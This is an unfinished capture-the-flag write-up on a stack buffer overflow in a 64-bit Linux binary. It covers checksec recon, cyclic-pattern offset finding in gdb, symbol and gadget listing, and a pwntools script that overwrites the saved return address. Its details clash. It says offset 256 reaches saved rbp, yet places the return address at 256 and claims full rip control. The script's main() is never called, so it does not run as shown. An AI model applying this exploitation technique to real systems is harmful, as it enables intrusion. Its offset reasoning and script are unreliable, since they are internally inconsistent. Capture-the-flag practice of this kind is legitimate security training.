# Challenge: chal 1
- Category: BinEx

## Description

Was given a `main` file and a `Dockerfile`
## Flag: 


## Solution
- ### recon – checking binary protections  

`checksec ./main`
output showed:
```
- arch: amd64  
- relro: partial  
- stack: no canary  
- nx: enabled  
- pie: disabled (base at `0x400000`)  
- stripped: no  
```
so we’re dealing with a 64‑bit linux elf, no stack canary, and a fixed code segment thanks to no pie. nx means no direct shellcode on the stack, so i think its rop/ret territory

- ### decompiling / disassembling `main` using binaryninja on dogbolt gave me:

- `setup()` does some `setbuf` calls to mess with buffering.  
- `alarm(0x3c)` sets a 60‑second time limit.  
- `read(0, &buf, 0x110)` reads 0x110 (272) bytes from stdin into a stack buffer.  

the stack buffer is smaller than 0x110 bytes, so `read` overflows the local buffer and walks over saved rbp and then saved rip. no canary to stop us, and with no pie we know code addresses statically.

- ### gaining rip control – using cyclic patterns  

- to exploit i needed the exact offset from the start of the input to saved rip.
```
python3 - << 'EOF'
from pwn import *
print(cyclic(400).decode())
EOF
```
and got the output as `aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad`

- so i ran 
```
gdb -q ./main
(gdb) r
```
- when the program waits for input, i fed the output i had gotten above
- checking registers gave me `rbp = 0x636161706361616f`, this value lies inside the cyclic pattern. we can use it to compute the offset to saved rbp (and thus rip, which is 8 bytes above).

so i found the offset using
```
python3 - << 'EOF'
from pwn import *
print(cyclic_find(0x636161706361616f))
EOF
```
i got the offset as 256, so 256 bytes of input overwrite up to saved rbp; the next 8 bytes overwrite saved rip, anything we place after 256 junk bytes will become the new return address.

- ### listing symbols:

`
nm -C ./main | grep -Ei "gadgets|win|flag"
`
i got output as 
`0000000000401175 T gadgets`

no `win`, no `flag`, no `system`, but there is `gadgets` atleast, looking at what this does now, i disassembled it using

```
(gdb) disas gadgets
```

disassembly:

```asm
0x0000000000401175 <gadgets+0>:  push   rbp
0x0000000000401176 <gadgets+1>:  mov    rbp, rsp
0x0000000000401179 <gadgets+4>:  mov    r12, 0x50f
0x0000000000401180 <gadgets+11>: nop
0x0000000000401181 <gadgets+12>: pop    rbp
0x0000000000401182 <gadgets+13>: ret
```

so `gadgets` just sets `r12` to a constant and returns. it doesn’t print the flag, doesn’t spawn a shell, so im not really sure of where to go from here, i can redirect execution to `gadgets` without crashing, just to prove that the binary overflow is exploitable but i cant think of a way to move further ahead to get the flag.
***

- ### wrote a script to redirect output to `gadgets` 
```python
from pwn import *

# set up context and binary
elf = context.binary = ELF('./main', checksec=False)
context.log_level = 'debug'

OFFSET = 256
GADGETS = elf.symbols['gadgets']

def main():
    io = process(elf.path)

    payload  = b'A' * OFFSET
    payload += p64(GADGETS)

    io.send(payload)
    io.interactive()
```

output:

```
[+] Starting local process '/mnt/c/Users/advay/Desktop/cryptonite/binex/main' ...
[DEBUG] Sent 0x108 bytes:
    00000000  41 41 41 41 ...  (256 'A's)
    00000100  75 11 40 00 00 00 00 00  │u·@·│····│
[*] Switching to interactive mode
[*] Process '/mnt/c/.../main' stopped with exit code 0
[*] Got EOF while reading in interactive
$
```

the important part:

- we sent exactly `256` bytes of padding plus `0x401175` (`gadgets`) as the new rip.  
- the program did not crash; it returned and exited cleanly.  

with a breakpoint on `gadgets` in gdb, we can see execution land exactly at that function, which confirms full control of the return address.

- ### trying syscall + rop angle  

a deeper look with `ROPgadget --binary ./main` shows a bare `syscall` gadget and some odd fixed‑value movers (`mov r12, 0x50f`, `mov eax, 0`, etc.), but no straightforward `pop rdi; ret` / `pop rsi; ret` / `pop rdx; ret` / `pop rax; ret` sequence
combined with:

- no `system` / `puts` in the plt,  
- only `read`, `setbuf`, `alarm` imported,  
- no provided `libc` file,  

## conclusion 

- find a classic `read` overflow into a stack buffer,  
- use cyclic patterns to measure the exact offset (`256` bytes to rip),  
- and redirect execution to a known function (`gadgets` at `0x401175`)
